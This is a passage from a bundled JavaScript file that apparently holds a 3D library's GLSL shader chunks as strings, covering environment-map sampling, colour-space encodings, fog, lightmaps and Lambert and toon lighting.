0.0 ) ).xyz );\n}\nvec3 inverseTransformDirection( in vec3 dir, in mat4 matrix ) {\n\treturn normalize( ( vec4( dir, 0.0 ) * matrix ).xyz );\n}\nvec3 projectOnPlane(in vec3 point, in vec3 pointOnPlane, in vec3 planeNormal ) {\n\tfloat distance = dot( planeNormal, point - pointOnPlane );\n\treturn - distance * planeNormal + point;\n}\nfloat sideOfPlane( in vec3 point, in vec3 pointOnPlane, in vec3 planeNormal ) {\n\treturn sign( dot( point - pointOnPlane, planeNormal ) );\n}\nvec3 linePlaneIntersect( in vec3 pointOnLine, in vec3 lineDirection, in vec3 pointOnPlane, in vec3 planeNormal ) {\n\treturn lineDirection * ( dot( planeNormal, pointOnPlane - pointOnLine ) / dot( planeNormal, lineDirection ) ) + pointOnLine;\n}\nmat3 transposeMat3( const in mat3 m ) {\n\tmat3 tmp;\n\ttmp[ 0 ] = vec3( m[ 0 ].x, m[ 1 ].x, m[ 2 ].x );\n\ttmp[ 1 ] = vec3( m[ 0 ].y, m[ 1 ].y, m[ 2 ].y );\n\ttmp[ 2 ] = vec3( m[ 0 ].z, m[ 1 ].z, m[ 2 ].z );\n\treturn tmp;\n}\nfloat linearToRelativeLuminance( const in vec3 color ) {\n\tvec3 weights = vec3( 0.2126, 0.7152, 0.0722 );\n\treturn dot( weights, color.rgb );\n}\nbool isPerspectiveMatrix( mat4 m ) {\n\treturn m[ 2 ][ 3 ] == - 1.0;\n}\nvec2 equirectUv( in vec3 dir ) {\n\tfloat u = atan( dir.z, dir.x ) * RECIPROCAL_PI2 + 0.5;\n\tfloat v = asin( clamp( dir.y, - 1.0, 1.0 ) ) * RECIPROCAL_PI + 0.5;\n\treturn vec2( u, v );\n}", cube_uv_reflection_fragment: "#ifdef ENVMAP_TYPE_CUBE_UV\n\t#define cubeUV_maxMipLevel 8.0\n\t#define cubeUV_minMipLevel 4.0\n\t#define cubeUV_maxTileSize 256.0\n\t#define cubeUV_minTileSize 16.0\n\tfloat getFace( vec3 direction ) {\n\t\tvec3 absDirection = abs( direction );\n\t\tfloat face = - 1.0;\n\t\tif ( absDirection.x > absDirection.z ) {\n\t\t\tif ( absDirection.x > absDirection.y )\n\t\t\t\tface = direction.x > 0.0 ? 0.0 : 3.0;\n\t\t\telse\n\t\t\t\tface = direction.y > 0.0 ? 1.0 : 4.0;\n\t\t} else {\n\t\t\tif ( absDirection.z > absDirection.y )\n\t\t\t\tface = direction.z > 0.0 ? 2.0 : 5.0;\n\t\t\telse\n\t\t\t\tface = direction.y > 0.0 ? 1.0 : 4.0;\n\t\t}\n\t\treturn face;\n\t}\n\tvec2 getUV( vec3 direction, float face ) {\n\t\tvec2 uv;\n\t\tif ( face == 0.0 ) {\n\t\t\tuv = vec2( direction.z, direction.y ) / abs( direction.x );\n\t\t} else if ( face == 1.0 ) {\n\t\t\tuv = vec2( - direction.x, - direction.z ) / abs( direction.y );\n\t\t} else if ( face == 2.0 ) {\n\t\t\tuv = vec2( - direction.x, direction.y ) / abs( direction.z );\n\t\t} else if ( face == 3.0 ) {\n\t\t\tuv = vec2( - direction.z, direction.y ) / abs( direction.x );\n\t\t} else if ( face == 4.0 ) {\n\t\t\tuv = vec2( - direction.x, direction.z ) / abs( direction.y );\n\t\t} else {\n\t\t\tuv = vec2( direction.x, direction.y ) / abs( direction.z );\n\t\t}\n\t\treturn 0.5 * ( uv + 1.0 );\n\t}\n\tvec3 bilinearCubeUV( sampler2D envMap, vec3 direction, float mipInt ) {\n\t\tfloat face = getFace( direction );\n\t\tfloat filterInt = max( cubeUV_minMipLevel - mipInt, 0.0 );\n\t\tmipInt = max( mipInt, cubeUV_minMipLevel );\n\t\tfloat faceSize = exp2( mipInt );\n\t\tfloat texelSize = 1.0 / ( 3.0 * cubeUV_maxTileSize );\n\t\tvec2 uv = getUV( direction, face ) * ( faceSize - 1.0 );\n\t\tvec2 f = fract( uv );\n\t\tuv += 0.5 - f;\n\t\tif ( face > 2.0 ) {\n\t\t\tuv.y += faceSize;\n\t\t\tface -= 3.0;\n\t\t}\n\t\tuv.x += face * faceSize;\n\t\tif ( mipInt < cubeUV_maxMipLevel ) {\n\t\t\tuv.y += 2.0 * cubeUV_maxTileSize;\n\t\t}\n\t\tuv.y += filterInt * 2.0 * cubeUV_minTileSize;\n\t\tuv.x += 3.0 * max( 0.0, cubeUV_maxTileSize - 2.0 * faceSize );\n\t\tuv *= texelSize;\n\t\tvec3 tl = envMapTexelToLinear( texture2D( envMap, uv ) ).rgb;\n\t\tuv.x += texelSize;\n\t\tvec3 tr = envMapTexelToLinear( texture2D( envMap, uv ) ).rgb;\n\t\tuv.y += texelSize;\n\t\tvec3 br = envMapTexelToLinear( texture2D( envMap, uv ) ).rgb;\n\t\tuv.x -= texelSize;\n\t\tvec3 bl = envMapTexelToLinear( texture2D( envMap, uv ) ).rgb;\n\t\tvec3 tm = mix( tl, tr, f.x );\n\t\tvec3 bm = mix( bl, br, f.x );\n\t\treturn mix( tm, bm, f.y );\n\t}\n\t#define r0 1.0\n\t#define v0 0.339\n\t#define m0 - 2.0\n\t#define r1 0.8\n\t#define v1 0.276\n\t#define m1 - 1.0\n\t#define r4 0.4\n\t#define v4 0.046\n\t#define m4 2.0\n\t#define r5 0.305\n\t#define v5 0.016\n\t#define m5 3.0\n\t#define r6 0.21\n\t#define v6 0.0038\n\t#define m6 4.0\n\tfloat roughnessToMip( float roughness ) {\n\t\tfloat mip = 0.0;\n\t\tif ( roughness >= r1 ) {\n\t\t\tmip = ( r0 - roughness ) * ( m1 - m0 ) / ( r0 - r1 ) + m0;\n\t\t} else if ( roughness >= r4 ) {\n\t\t\tmip = ( r1 - roughness ) * ( m4 - m1 ) / ( r1 - r4 ) + m1;\n\t\t} else if ( roughness >= r5 ) {\n\t\t\tmip = ( r4 - roughness ) * ( m5 - m4 ) / ( r4 - r5 ) + m4;\n\t\t} else if ( roughness >= r6 ) {\n\t\t\tmip = ( r5 - roughness ) * ( m6 - m5 ) / ( r5 - r6 ) + m5;\n\t\t} else {\n\t\t\tmip = - 2.0 * log2( 1.16 * roughness );\t\t}\n\t\treturn mip;\n\t}\n\tvec4 textureCubeUV( sampler2D envMap, vec3 sampleDir, float roughness ) {\n\t\tfloat mip = clamp( roughnessToMip( roughness ), m0, cubeUV_maxMipLevel );\n\t\tfloat mipF = fract( mip );\n\t\tfloat mipInt = floor( mip );\n\t\tvec3 color0 = bilinearCubeUV( envMap, sampleDir, mipInt );\n\t\tif ( mipF == 0.0 ) {\n\t\t\treturn vec4( color0, 1.0 );\n\t\t} else {\n\t\t\tvec3 color1 = bilinearCubeUV( envMap, sampleDir, mipInt + 1.0 );\n\t\t\treturn vec4( mix( color0, color1, mipF ), 1.0 );\n\t\t}\n\t}\n#endif", defaultnormal_vertex: "vec3 transformedNormal = objectNormal;\n#ifdef USE_INSTANCING\n\tmat3 m = mat3( instanceMatrix );\n\ttransformedNormal /= vec3( dot( m[ 0 ], m[ 0 ] ), dot( m[ 1 ], m[ 1 ] ), dot( m[ 2 ], m[ 2 ] ) );\n\ttransformedNormal = m * transformedNormal;\n#endif\ntransformedNormal = normalMatrix * transformedNormal;\n#ifdef FLIP_SIDED\n\ttransformedNormal = - transformedNormal;\n#endif\n#ifdef USE_TANGENT\n\tvec3 transformedTangent = ( modelViewMatrix * vec4( objectTangent, 0.0 ) ).xyz;\n\t#ifdef FLIP_SIDED\n\t\ttransformedTangent = - transformedTangent;\n\t#endif\n#endif", displacementmap_pars_vertex: "#ifdef USE_DISPLACEMENTMAP\n\tuniform sampler2D displacementMap;\n\tuniform float displacementScale;\n\tuniform float displacementBias;\n#endif", displacementmap_vertex: "#ifdef USE_DISPLACEMENTMAP\n\ttransformed += normalize( objectNormal ) * ( texture2D( displacementMap, vUv ).x * displacementScale + displacementBias );\n#endif", emissivemap_fragment: "#ifdef USE_EMISSIVEMAP\n\tvec4 emissiveColor = texture2D( emissiveMap, vUv );\n\temissiveColor.rgb = emissiveMapTexelToLinear( emissiveColor ).rgb;\n\ttotalEmissiveRadiance *= emissiveColor.rgb;\n#endif", emissivemap_pars_fragment: "#ifdef USE_EMISSIVEMAP\n\tuniform sampler2D emissiveMap;\n#endif", encodings_fragment: "gl_FragColor = linearToOutputTexel( gl_FragColor );", encodings_pars_fragment: "\nvec4 LinearToLinear( in vec4 value ) {\n\treturn value;\n}\nvec4 GammaToLinear( in vec4 value, in float gammaFactor ) {\n\treturn vec4( pow( value.rgb, vec3( gammaFactor ) ), value.a );\n}\nvec4 LinearToGamma( in vec4 value, in float gammaFactor ) {\n\treturn vec4( pow( value.rgb, vec3( 1.0 / gammaFactor ) ), value.a );\n}\nvec4 sRGBToLinear( in vec4 value ) {\n\treturn vec4( mix( pow( value.rgb * 0.9478672986 + vec3( 0.0521327014 ), vec3( 2.4 ) ), value.rgb * 0.0773993808, vec3( lessThanEqual( value.rgb, vec3( 0.04045 ) ) ) ), value.a );\n}\nvec4 LinearTosRGB( in vec4 value ) {\n\treturn vec4( mix( pow( value.rgb, vec3( 0.41666 ) ) * 1.055 - vec3( 0.055 ), value.rgb * 12.92, vec3( lessThanEqual( value.rgb, vec3( 0.0031308 ) ) ) ), value.a );\n}\nvec4 RGBEToLinear( in vec4 value ) {\n\treturn vec4( value.rgb * exp2( value.a * 255.0 - 128.0 ), 1.0 );\n}\nvec4 LinearToRGBE( in vec4 value ) {\n\tfloat maxComponent = max( max( value.r, value.g ), value.b );\n\tfloat fExp = clamp( ceil( log2( maxComponent ) ), -128.0, 127.0 );\n\treturn vec4( value.rgb / exp2( fExp ), ( fExp + 128.0 ) / 255.0 );\n}\nvec4 RGBMToLinear( in vec4 value, in float maxRange ) {\n\treturn vec4( value.rgb * value.a * maxRange, 1.0 );\n}\nvec4 LinearToRGBM( in vec4 value, in float maxRange ) {\n\tfloat maxRGB = max( value.r, max( value.g, value.b ) );\n\tfloat M = clamp( maxRGB / maxRange, 0.0, 1.0 );\n\tM = ceil( M * 255.0 ) / 255.0;\n\treturn vec4( value.rgb / ( M * maxRange ), M );\n}\nvec4 RGBDToLinear( in vec4 value, in float maxRange ) {\n\treturn vec4( value.rgb * ( ( maxRange / 255.0 ) / value.a ), 1.0 );\n}\nvec4 LinearToRGBD( in vec4 value, in float maxRange ) {\n\tfloat maxRGB = max( value.r, max( value.g, value.b ) );\n\tfloat D = max( maxRange / maxRGB, 1.0 );\n\tD = clamp( floor( D ) / 255.0, 0.0, 1.0 );\n\treturn vec4( value.rgb * ( D * ( 255.0 / maxRange ) ), D );\n}\nconst mat3 cLogLuvM = mat3( 0.2209, 0.3390, 0.4184, 0.1138, 0.6780, 0.7319, 0.0102, 0.1130, 0.2969 );\nvec4 LinearToLogLuv( in vec4 value ) {\n\tvec3 Xp_Y_XYZp = cLogLuvM * value.rgb;\n\tXp_Y_XYZp = max( Xp_Y_XYZp, vec3( 1e-6, 1e-6, 1e-6 ) );\n\tvec4 vResult;\n\tvResult.xy = Xp_Y_XYZp.xy / Xp_Y_XYZp.z;\n\tfloat Le = 2.0 * log2(Xp_Y_XYZp.y) + 127.0;\n\tvResult.w = fract( Le );\n\tvResult.z = ( Le - ( floor( vResult.w * 255.0 ) ) / 255.0 ) / 255.0;\n\treturn vResult;\n}\nconst mat3 cLogLuvInverseM = mat3( 6.0014, -2.7008, -1.7996, -1.3320, 3.1029, -5.7721, 0.3008, -1.0882, 5.6268 );\nvec4 LogLuvToLinear( in vec4 value ) {\n\tfloat Le = value.z * 255.0 + value.w;\n\tvec3 Xp_Y_XYZp;\n\tXp_Y_XYZp.y = exp2( ( Le - 127.0 ) / 2.0 );\n\tXp_Y_XYZp.z = Xp_Y_XYZp.y / value.y;\n\tXp_Y_XYZp.x = value.x * Xp_Y_XYZp.z;\n\tvec3 vRGB = cLogLuvInverseM * Xp_Y_XYZp.rgb;\n\treturn vec4( max( vRGB, 0.0 ), 1.0 );\n}", envmap_fragment: "#ifdef USE_ENVMAP\n\t#ifdef ENV_WORLDPOS\n\t\tvec3 cameraToFrag;\n\t\tif ( isOrthographic ) {\n\t\t\tcameraToFrag = normalize( vec3( - viewMatrix[ 0 ][ 2 ], - viewMatrix[ 1 ][ 2 ], - viewMatrix[ 2 ][ 2 ] ) );\n\t\t} else {\n\t\t\tcameraToFrag = normalize( vWorldPosition - cameraPosition );\n\t\t}\n\t\tvec3 worldNormal = inverseTransformDirection( normal, viewMatrix );\n\t\t#ifdef ENVMAP_MODE_REFLECTION\n\t\t\tvec3 reflectVec = reflect( cameraToFrag, worldNormal );\n\t\t#else\n\t\t\tvec3 reflectVec = refract( cameraToFrag, worldNormal, refractionRatio );\n\t\t#endif\n\t#else\n\t\tvec3 reflectVec = vReflect;\n\t#endif\n\t#ifdef ENVMAP_TYPE_CUBE\n\t\tvec4 envColor = textureCube( envMap, vec3( flipEnvMap * reflectVec.x, reflectVec.yz ) );\n\t#elif defined( ENVMAP_TYPE_CUBE_UV )\n\t\tvec4 envColor = textureCubeUV( envMap, reflectVec, 0.0 );\n\t#else\n\t\tvec4 envColor = vec4( 0.0 );\n\t#endif\n\t#ifndef ENVMAP_TYPE_CUBE_UV\n\t\tenvColor = envMapTexelToLinear( envColor );\n\t#endif\n\t#ifdef ENVMAP_BLENDING_MULTIPLY\n\t\toutgoingLight = mix( outgoingLight, outgoingLight * envColor.xyz, specularStrength * reflectivity );\n\t#elif defined( ENVMAP_BLENDING_MIX )\n\t\toutgoingLight = mix( outgoingLight, envColor.xyz, specularStrength * reflectivity );\n\t#elif defined( ENVMAP_BLENDING_ADD )\n\t\toutgoingLight += envColor.xyz * specularStrength * reflectivity;\n\t#endif\n#endif", envmap_common_pars_fragment: "#ifdef USE_ENVMAP\n\tuniform float envMapIntensity;\n\tuniform float flipEnvMap;\n\tuniform int maxMipLevel;\n\t#ifdef ENVMAP_TYPE_CUBE\n\t\tuniform samplerCube envMap;\n\t#else\n\t\tuniform sampler2D envMap;\n\t#endif\n\t\n#endif", envmap_pars_fragment: "#ifdef USE_ENVMAP\n\tuniform float reflectivity;\n\t#if defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( PHONG )\n\t\t#define ENV_WORLDPOS\n\t#endif\n\t#ifdef ENV_WORLDPOS\n\t\tvarying vec3 vWorldPosition;\n\t\tuniform float refractionRatio;\n\t#else\n\t\tvarying vec3 vReflect;\n\t#endif\n#endif", envmap_pars_vertex: "#ifdef USE_ENVMAP\n\t#if defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) ||defined( PHONG )\n\t\t#define ENV_WORLDPOS\n\t#endif\n\t#ifdef ENV_WORLDPOS\n\t\t\n\t\tvarying vec3 vWorldPosition;\n\t#else\n\t\tvarying vec3 vReflect;\n\t\tuniform float refractionRatio;\n\t#endif\n#endif", envmap_physical_pars_fragment: "#if defined( USE_ENVMAP )\n\t#ifdef ENVMAP_MODE_REFRACTION\n\t\tuniform float refractionRatio;\n\t#endif\n\tvec3 getLightProbeIndirectIrradiance( const in GeometricContext geometry, const in int maxMIPLevel ) {\n\t\tvec3 worldNormal = inverseTransformDirection( geometry.normal, viewMatrix );\n\t\t#ifdef ENVMAP_TYPE_CUBE\n\t\t\tvec3 queryVec = vec3( flipEnvMap * worldNormal.x, worldNormal.yz );\n\t\t\t#ifdef TEXTURE_LOD_EXT\n\t\t\t\tvec4 envMapColor = textureCubeLodEXT( envMap, queryVec, float( maxMIPLevel ) );\n\t\t\t#else\n\t\t\t\tvec4 envMapColor = textureCube( envMap, queryVec, float( maxMIPLevel ) );\n\t\t\t#endif\n\t\t\tenvMapColor.rgb = envMapTexelToLinear( envMapColor ).rgb;\n\t\t#elif defined( ENVMAP_TYPE_CUBE_UV )\n\t\t\tvec4 envMapColor = textureCubeUV( envMap, worldNormal, 1.0 );\n\t\t#else\n\t\t\tvec4 envMapColor = vec4( 0.0 );\n\t\t#endif\n\t\treturn PI * envMapColor.rgb * envMapIntensity;\n\t}\n\tfloat getSpecularMIPLevel( const in float roughness, const in int maxMIPLevel ) {\n\t\tfloat maxMIPLevelScalar = float( maxMIPLevel );\n\t\tfloat sigma = PI * roughness * roughness / ( 1.0 + roughness );\n\t\tfloat desiredMIPLevel = maxMIPLevelScalar + log2( sigma );\n\t\treturn clamp( desiredMIPLevel, 0.0, maxMIPLevelScalar );\n\t}\n\tvec3 getLightProbeIndirectRadiance( const in vec3 viewDir, const in vec3 normal, const in float roughness, const in int maxMIPLevel ) {\n\t\t#ifdef ENVMAP_MODE_REFLECTION\n\t\t\tvec3 reflectVec = reflect( -viewDir, normal );\n\t\t\treflectVec = normalize( mix( reflectVec, normal, roughness * roughness) );\n\t\t#else\n\t\t\tvec3 reflectVec = refract( -viewDir, normal, refractionRatio );\n\t\t#endif\n\t\treflectVec = inverseTransformDirection( reflectVec, viewMatrix );\n\t\tfloat specularMIPLevel = getSpecularMIPLevel( roughness, maxMIPLevel );\n\t\t#ifdef ENVMAP_TYPE_CUBE\n\t\t\tvec3 queryReflectVec = vec3( flipEnvMap * reflectVec.x, reflectVec.yz );\n\t\t\t#ifdef TEXTURE_LOD_EXT\n\t\t\t\tvec4 envMapColor = textureCubeLodEXT( envMap, queryReflectVec, specularMIPLevel );\n\t\t\t#else\n\t\t\t\tvec4 envMapColor = textureCube( envMap, queryReflectVec, specularMIPLevel );\n\t\t\t#endif\n\t\t\tenvMapColor.rgb = envMapTexelToLinear( envMapColor ).rgb;\n\t\t#elif defined( ENVMAP_TYPE_CUBE_UV )\n\t\t\tvec4 envMapColor = textureCubeUV( envMap, reflectVec, roughness );\n\t\t#endif\n\t\treturn envMapColor.rgb * envMapIntensity;\n\t}\n#endif", envmap_vertex: "#ifdef USE_ENVMAP\n\t#ifdef ENV_WORLDPOS\n\t\tvWorldPosition = worldPosition.xyz;\n\t#else\n\t\tvec3 cameraToVertex;\n\t\tif ( isOrthographic ) {\n\t\t\tcameraToVertex = normalize( vec3( - viewMatrix[ 0 ][ 2 ], - viewMatrix[ 1 ][ 2 ], - viewMatrix[ 2 ][ 2 ] ) );\n\t\t} else {\n\t\t\tcameraToVertex = normalize( worldPosition.xyz - cameraPosition );\n\t\t}\n\t\tvec3 worldNormal = inverseTransformDirection( transformedNormal, viewMatrix );\n\t\t#ifdef ENVMAP_MODE_REFLECTION\n\t\t\tvReflect = reflect( cameraToVertex, worldNormal );\n\t\t#else\n\t\t\tvReflect = refract( cameraToVertex, worldNormal, refractionRatio );\n\t\t#endif\n\t#endif\n#endif", fog_vertex: "#ifdef USE_FOG\n\tfogDepth = - mvPosition.z;\n#endif", fog_pars_vertex: "#ifdef USE_FOG\n\tvarying float fogDepth;\n#endif", fog_fragment: "#ifdef USE_FOG\n\t#ifdef FOG_EXP2\n\t\tfloat fogFactor = 1.0 - exp( - fogDensity * fogDensity * fogDepth * fogDepth );\n\t#else\n\t\tfloat fogFactor = smoothstep( fogNear, fogFar, fogDepth );\n\t#endif\n\tgl_FragColor.rgb = mix( gl_FragColor.rgb, fogColor, fogFactor );\n#endif", fog_pars_fragment: "#ifdef USE_FOG\n\tuniform vec3 fogColor;\n\tvarying float fogDepth;\n\t#ifdef FOG_EXP2\n\t\tuniform float fogDensity;\n\t#else\n\t\tuniform float fogNear;\n\t\tuniform float fogFar;\n\t#endif\n#endif", gradientmap_pars_fragment: "#ifdef USE_GRADIENTMAP\n\tuniform sampler2D gradientMap;\n#endif\nvec3 getGradientIrradiance( vec3 normal, vec3 lightDirection ) {\n\tfloat dotNL = dot( normal, lightDirection );\n\tvec2 coord = vec2( dotNL * 0.5 + 0.5, 0.0 );\n\t#ifdef USE_GRADIENTMAP\n\t\treturn texture2D( gradientMap, coord ).rgb;\n\t#else\n\t\treturn ( coord.x < 0.7 ) ? vec3( 0.7 ) : vec3( 1.0 );\n\t#endif\n}", lightmap_fragment: "#ifdef USE_LIGHTMAP\n\tvec4 lightMapTexel= texture2D( lightMap, vUv2 );\n\treflectedLight.indirectDiffuse += PI * lightMapTexelToLinear( lightMapTexel ).rgb * lightMapIntensity;\n#endif", lightmap_pars_fragment: "#ifdef USE_LIGHTMAP\n\tuniform sampler2D lightMap;\n\tuniform float lightMapIntensity;\n#endif", lights_lambert_vertex: "vec3 diffuse = vec3( 1.0 );\nGeometricContext geometry;\ngeometry.position = mvPosition.xyz;\ngeometry.normal = normalize( transformedNormal );\ngeometry.viewDir = ( isOrthographic ) ? vec3( 0, 0, 1 ) : normalize( -mvPosition.xyz );\nGeometricContext backGeometry;\nbackGeometry.position = geometry.position;\nbackGeometry.normal = -geometry.normal;\nbackGeometry.viewDir = geometry.viewDir;\nvLightFront = vec3( 0.0 );\nvIndirectFront = vec3( 0.0 );\n#ifdef DOUBLE_SIDED\n\tvLightBack = vec3( 0.0 );\n\tvIndirectBack = vec3( 0.0 );\n#endif\nIncidentLight directLight;\nfloat dotNL;\nvec3 directLightColor_Diffuse;\nvIndirectFront += getAmbientLightIrradiance( ambientLightColor );\nvIndirectFront += getLightProbeIrradiance( lightProbe, geometry );\n#ifdef DOUBLE_SIDED\n\tvIndirectBack += getAmbientLightIrradiance( ambientLightColor );\n\tvIndirectBack += getLightProbeIrradiance( lightProbe, backGeometry );\n#endif\n#if NUM_POINT_LIGHTS > 0\n\t#pragma unroll_loop_start\n\tfor ( int i = 0; i < NUM_POINT_LIGHTS; i ++ ) {\n\t\tgetPointDirectLightIrradiance( pointLights[ i ], geometry, directLight );\n\t\tdotNL = dot( geometry.normal, directLight.direction );\n\t\tdirectLightColor_Diffuse = PI * directLight.color;\n\t\tvLightFront += saturate( dotNL ) * directLightColor_Diffuse;\n\t\t#ifdef DOUBLE_SIDED\n\t\t\tvLightBack += saturate( -dotNL ) * directLightColor_Diffuse;\n\t\t#endif\n\t}\n\t#pragma unroll_loop_end\n#endif\n#if NUM_SPOT_LIGHTS > 0\n\t#pragma unroll_loop_start\n\tfor ( int i = 0; i < NUM_SPOT_LIGHTS; i ++ ) {\n\t\tgetSpotDirectLightIrradiance( spotLights[ i ], geometry, directLight );\n\t\tdotNL = dot( geometry.normal, directLight.direction );\n\t\tdirectLightColor_Diffuse = PI * directLight.color;\n\t\tvLightFront += saturate( dotNL ) * directLightColor_Diffuse;\n\t\t#ifdef DOUBLE_SIDED\n\t\t\tvLightBack += saturate( -dotNL ) * directLightColor_Diffuse;\n\t\t#endif\n\t}\n\t#pragma unroll_loop_end\n#endif\n#if NUM_DIR_LIGHTS > 0\n\t#pragma unroll_loop_start\n\tfor ( int i = 0; i < NUM_DIR_LIGHTS; i ++ ) {\n\t\tgetDirectionalDirectLightIrradiance( directionalLights[ i ], geometry, directLight );\n\t\tdotNL = dot( geometry.normal, directLight.direction );\n\t\tdirectLightColor_Diffuse = PI * directLight.color;\n\t\tvLightFront += saturate( dotNL ) * directLightColor_Diffuse;\n\t\t#ifdef DOUBLE_SIDED\n\t\t\tvLightBack += saturate( -dotNL ) * directLightColor_Diffuse;\n\t\t#endif\n\t}\n\t#pragma unroll_loop_end\n#endif\n#if NUM_HEMI_LIGHTS > 0\n\t#pragma unroll_loop_start\n\tfor ( int i = 0; i < NUM_HEMI_LIGHTS; i ++ ) {\n\t\tvIndirectFront += getHemisphereLightIrradiance( hemisphereLights[ i ], geometry );\n\t\t#ifdef DOUBLE_SIDED\n\t\t\tvIndirectBack += getHemisphereLightIrradiance( hemisphereLights[ i ], backGeometry );\n\t\t#endif\n\t}\n\t#pragma unroll_loop_end\n#endif", lights_pars_begin: "uniform bool receiveShadow;\nuniform vec3 ambientLightColor;\nuniform vec3 lightProbe[ 9 ];\nvec3 shGetIrradianceAt( in vec3 normal, in vec3 shCoefficients[ 9 ] ) {\n\tfloat x = normal.x, y = normal.y, z = normal.z;\n\tvec3 result = shCoefficients[ 0 ] * 0.886227;\n\tresult += shCoefficients[ 1 ] * 2.0 * 0.511664 * y;\n\tresult += shCoefficients[ 2 ] * 2.0 * 0.511664 * z;\n\tresult += shCoefficients[ 3 ] * 2.0 * 0.511664 * x;\n\tresult += shCoefficients[ 4 ] * 2.0 * 0.429043 * x * y;\n\tresult += shCoefficients[ 5 ] * 2.0 * 0.429043 * y * z;\n\tresult += shCoefficients[ 6 ] * ( 0.743125 * z * z - 0.247708 );\n\tresult += shCoefficients[ 7 ] * 2.0 * 0.429043 * x * z;\n\tresult += shCoefficients[ 8 ] * 0.429043 * ( x * x - y * y );\n\treturn result;\n}\nvec3 getLightProbeIrradiance( const in vec3 lightProbe[ 9 ], const in GeometricContext geometry ) {\n\tvec3 worldNormal = inverseTransformDirection( geometry.normal, viewMatrix );\n\tvec3 irradiance = shGetIrradianceAt( worldNormal, lightProbe );\n\treturn irradiance;\n}\nvec3 getAmbientLightIrradiance( const in vec3 ambientLightColor ) {\n\tvec3 irradiance = ambientLightColor;\n\t#ifndef PHYSICALLY_CORRECT_LIGHTS\n\t\tirradiance *= PI;\n\t#endif\n\treturn irradiance;\n}\n#if NUM_DIR_LIGHTS > 0\n\tstruct DirectionalLight {\n\t\tvec3 direction;\n\t\tvec3 color;\n\t};\n\tuniform DirectionalLight directionalLights[ NUM_DIR_LIGHTS ];\n\tvoid getDirectionalDirectLightIrradiance( const in DirectionalLight directionalLight, const in GeometricContext geometry, out IncidentLight directLight ) {\n\t\tdirectLight.color = directionalLight.color;\n\t\tdirectLight.direction = directionalLight.direction;\n\t\tdirectLight.visible = true;\n\t}\n#endif\n#if NUM_POINT_LIGHTS > 0\n\tstruct PointLight {\n\t\tvec3 position;\n\t\tvec3 color;\n\t\tfloat distance;\n\t\tfloat decay;\n\t};\n\tuniform PointLight pointLights[ NUM_POINT_LIGHTS ];\n\tvoid getPointDirectLightIrradiance( const in PointLight pointLight, const in GeometricContext geometry, out IncidentLight directLight ) {\n\t\tvec3 lVector = pointLight.position - geometry.position;\n\t\tdirectLight.direction = normalize( lVector );\n\t\tfloat lightDistance = length( lVector );\n\t\tdirectLight.color = pointLight.color;\n\t\tdirectLight.color *= punctualLightIntensityToIrradianceFactor( lightDistance, pointLight.distance, pointLight.decay );\n\t\tdirectLight.visible = ( directLight.color != vec3( 0.0 ) );\n\t}\n#endif\n#if NUM_SPOT_LIGHTS > 0\n\tstruct SpotLight {\n\t\tvec3 position;\n\t\tvec3 direction;\n\t\tvec3 color;\n\t\tfloat distance;\n\t\tfloat decay;\n\t\tfloat coneCos;\n\t\tfloat penumbraCos;\n\t};\n\tuniform SpotLight spotLights[ NUM_SPOT_LIGHTS ];\n\tvoid getSpotDirectLightIrradiance( const in SpotLight spotLight, const in GeometricContext geometry, out IncidentLight directLight ) {\n\t\tvec3 lVector = spotLight.position - geometry.position;\n\t\tdirectLight.direction = normalize( lVector );\n\t\tfloat lightDistance = length( lVector );\n\t\tfloat angleCos = dot( directLight.direction, spotLight.direction );\n\t\tif ( angleCos > spotLight.coneCos ) {\n\t\t\tfloat spotEffect = smoothstep( spotLight.coneCos, spotLight.penumbraCos, angleCos );\n\t\t\tdirectLight.color = spotLight.color;\n\t\t\tdirectLight.color *= spotEffect * punctualLightIntensityToIrradianceFactor( lightDistance, spotLight.distance, spotLight.decay );\n\t\t\tdirectLight.visible = true;\n\t\t} else {\n\t\t\tdirectLight.color = vec3( 0.0 );\n\t\t\tdirectLight.visible = false;\n\t\t}\n\t}\n#endif\n#if NUM_RECT_AREA_LIGHTS > 0\n\tstruct RectAreaLight {\n\t\tvec3 color;\n\t\tvec3 position;\n\t\tvec3 halfWidth;\n\t\tvec3 halfHeight;\n\t};\n\tuniform sampler2D ltc_1;\tuniform sampler2D ltc_2;\n\tuniform RectAreaLight rectAreaLights[ NUM_RECT_AREA_LIGHTS ];\n#endif\n#if NUM_HEMI_LIGHTS > 0\n\tstruct HemisphereLight {\n\t\tvec3 direction;\n\t\tvec3 skyColor;\n\t\tvec3 groundColor;\n\t};\n\tuniform HemisphereLight hemisphereLights[ NUM_HEMI_LIGHTS ];\n\tvec3 getHemisphereLightIrradiance( const in HemisphereLight hemiLight, const in GeometricContext geometry ) {\n\t\tfloat dotNL = dot( geometry.normal, hemiLight.direction );\n\t\tfloat hemiDiffuseWeight = 0.5 * dotNL + 0.5;\n\t\tvec3 irradiance = mix( hemiLight.groundColor, hemiLight.skyColor, hemiDiffuseWeight );\n\t\t#ifndef PHYSICALLY_CORRECT_LIGHTS\n\t\t\tirradiance *= PI;\n\t\t#endif\n\t\treturn irradiance;\n\t}\n#endif", lights_toon_fragment: "ToonMaterial material;\nmaterial.diffuseColor = diffuseColor.rgb;", lights_toon_pars_fragment: "varying vec3 vViewPosition;\n#ifndef FLAT_SHADED\n\tvarying vec3 vNormal;\n#endif\nstruct ToonMaterial {\n\tvec3 diffuseColor;\n};\nvoid RE_Direct_Toon( const in IncidentLight directLight, const in GeometricContext geometry, const in ToonMaterial material, inout ReflectedLight reflectedLight ) {\n\tvec3 irradiance = getGradientIrradiance( geometry.normal, directLight.direction ) * directLight.color;\n\t#ifndef PHYSICALLY_CORRECT_LIGHTS\n\t\tirradiance *= PI;\n\t#endif\n\treflectedLight.directDiffuse += irradiance * BRDF_Diffuse_Lambert( material.diffuseColor );\n}\nvoid RE_IndirectDiffuse_Toon( const in vec3 irradiance, const in GeometricContext geometry, const in ToonMaterial material, inout ReflectedLight reflectedLight ) {\n\treflectedLight.indirectDiffuse += irradiance * BRDF_Diffuse_Lambert( material.diffuseColor );\n}\n#define RE_Direct\t\t\t\tRE_Direct_Toon\n#define RE_IndirectDiffuse\t\tRE_IndirectDiffuse_Toon\n#define Material_LightProbeLOD( material )\t(0)", lights_phong_fragment: "BlinnPhongMaterial material;\nmaterial.diffuseColor = diffuseColor.rgb;\nmaterial.specularColor = specular;\nmaterial.specularShininess = shininess;\nmaterial.specularStrength = specularStrength;", lights_phong_pars_fragment: "varying vec3 